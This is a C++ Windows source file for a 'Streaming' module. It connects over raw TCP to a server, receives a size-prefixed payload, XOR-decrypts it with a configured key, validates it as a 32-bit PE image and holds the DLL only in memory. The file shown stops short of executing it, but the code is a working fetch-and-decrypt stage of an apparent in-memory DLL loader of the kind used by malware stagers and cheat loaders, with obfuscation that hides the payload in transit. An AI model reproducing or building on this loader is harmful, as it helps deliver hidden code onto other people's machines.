#include <iostream>
#include <Winsock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#include "Stream.h"
#include "encrypt.h"
#include "settings.h"

uint8_t* Streaming::binary_mem = nullptr;
size_t   Streaming::binary_size = 0;

struct WsaGuard
{
	bool initialised = false;
	WsaGuard()
	{
		WSADATA wsa;
		initialised = (WSAStartup(MAKEWORD(2, 2), &wsa) == 0);
	}
	~WsaGuard() { if (initialised) WSACleanup(); }
};

struct SocketGuard
{
	SOCKET s = INVALID_SOCKET;
	explicit SocketGuard(SOCKET sock) : s(sock) {}
	~SocketGuard() { if (s != INVALID_SOCKET) closesocket(s); }
};

static bool recv_exact(SOCKET s, void* buf, size_t len)
{
	size_t received = 0;
	auto* ptr = static_cast<char*>(buf);

	while (received < len)
	{
		int chunk = recv(s, ptr + received, static_cast<int>(min(len - received, Streaming::RECV_CHUNK_SIZE)), 0);
		if (chunk <= 0)
			return false;
		received += chunk;
	}
	return true;
}

static bool recv_until_eof(SOCKET s, uint8_t*& out_buf, size_t& out_size)
{
	size_t capacity = 256 * 1024;
	size_t received = 0;
	uint8_t* buf = static_cast<uint8_t*>(malloc(capacity));
	if (!buf) return false;

	while (true)
	{

		if (received >= capacity)
		{
			size_t new_cap = capacity * 2;
			if (new_cap > Streaming::MAX_DLL_SIZE)
			{
				free(buf);
				return false;
			}
			uint8_t* new_buf = static_cast<uint8_t*>(realloc(buf, new_cap));
			if (!new_buf)
			{
				free(buf);
				return false;
			}
			buf = new_buf;
			capacity = new_cap;
		}

		int chunk = recv(s, reinterpret_cast<char*>(buf + received),
			static_cast<int>(min(capacity - received, Streaming::RECV_CHUNK_SIZE)), 0);

		if (chunk == SOCKET_ERROR)
		{
			free(buf);
			return false;
		}
		if (chunk == 0)
			break;

		received += chunk;
	}

	if (received == 0)
	{
		free(buf);
		return false;
	}

	out_buf = buf;
	out_size = received;
	return true;
}

static void xor_decrypt(uint8_t* data, size_t size)
{
	for (size_t i = 0; i < size; i++)
		data[i] ^= Settings::XOR_KEY[i % Settings::XOR_KEY_SIZE];
}

static bool validate_pe(const uint8_t* data, size_t size)
{
	if (size < sizeof(IMAGE_DOS_HEADER))
		return false;

	auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(data);
	if (dos->e_magic != IMAGE_DOS_SIGNATURE)
		return false;

	if (static_cast<size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS32) > size)
		return false;

	auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS32*>(data + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE)
		return false;

	if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)
		return false;

	return true;
}

Streaming::StreamResult __fastcall Streaming::stream_dll(const char* server_ip, uint16_t port)
{

	cleanup();

	WsaGuard wsa;
	if (!wsa.initialised)
		return StreamResult::WsaInitFailed;

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
		return StreamResult::SocketCreateFailed;

	SocketGuard sg(sock);

	DWORD timeout = 15000;
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, reinterpret_cast<const char*>(&timeout), sizeof(timeout));

	SOCKADDR_IN addr{};
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	if (inet_pton(AF_INET, server_ip, &addr.sin_addr) <= 0)
		return StreamResult::InvalidAddress;

	if (connect(sock, reinterpret_cast<SOCKADDR*>(&addr), sizeof(addr)) != 0)
		return StreamResult::ConnectionFailed;

	uint32_t payload_size = 0;
	if (!recv_exact(sock, &payload_size, sizeof(payload_size)))
		return StreamResult::SizeReceiveFailed;

	bool size_prefixed = true;
	uint8_t* raw_data = nullptr;
	size_t   raw_size = 0;

	if (payload_size == 0)
		return StreamResult::SizeZero;

	if (payload_size > MAX_DLL_SIZE)
	{

		size_prefixed = false;
	}

	if (size_prefixed)
	{

		raw_data = static_cast<uint8_t*>(malloc(payload_size));
		if (!raw_data)
			return StreamResult::AllocationFailed;

		if (!recv_exact(sock, raw_data, payload_size))
		{
			free(raw_data);
			return StreamResult::DataReceiveFailed;
		}
		raw_size = payload_size;
	}
	else
	{

		uint8_t* eof_buf = nullptr;
		size_t   eof_size = 0;

		if (!recv_until_eof(sock, eof_buf, eof_size))
			return StreamResult::DataReceiveFailed;

		raw_size = sizeof(payload_size) + eof_size;
		raw_data = static_cast<uint8_t*>(malloc(raw_size));
		if (!raw_data)
		{
			free(eof_buf);
			return StreamResult::AllocationFailed;
		}
		memcpy(raw_data, &payload_size, sizeof(payload_size));
		memcpy(raw_data + sizeof(payload_size), eof_buf, eof_size);
		free(eof_buf);
	}

	xor_decrypt(raw_data, raw_size);

	if (!validate_pe(raw_data, raw_size))
	{
		free(raw_data);
		return StreamResult::DecryptionFailed;
	}

	binary_mem = raw_data;
	binary_size = raw_size;
	return StreamResult::Success;
}

const char* Streaming::result_to_string(StreamResult r)
{
	switch (r)
	{
	case StreamResult::Success:            return "Success";
	case StreamResult::WsaInitFailed:      return "WSA initialisation failed";
	case StreamResult::SocketCreateFailed: return "Socket creation failed";
	case StreamResult::InvalidAddress:     return "Invalid server IP address";
	case StreamResult::ConnectionFailed:   return "Connection to server failed";
	case StreamResult::SizeReceiveFailed:  return "Failed to receive size header";
	case StreamResult::SizeZero:           return "Server reported zero-byte payload";
	case StreamResult::SizeTooLarge:       return "Payload exceeds max allowed size";
	case StreamResult::AllocationFailed:   return "Memory allocation failed";
	case StreamResult::DataReceiveFailed:  return "Failed to receive payload data";
	case StreamResult::DataIncomplete:     return "Received fewer bytes than expected";
	case StreamResult::DecryptionFailed:   return "Decryption failed - bad key or corrupt data (PE validation failed)";
	default:                               return "Unknown error";
	}
}

void Streaming::cleanup()
{
	if (binary_mem)
	{

		SecureZeroMemory(const_cast<uint8_t*>(binary_mem), binary_size);
		free(binary_mem);
		binary_mem = nullptr;
		binary_size = 0;
	}
}
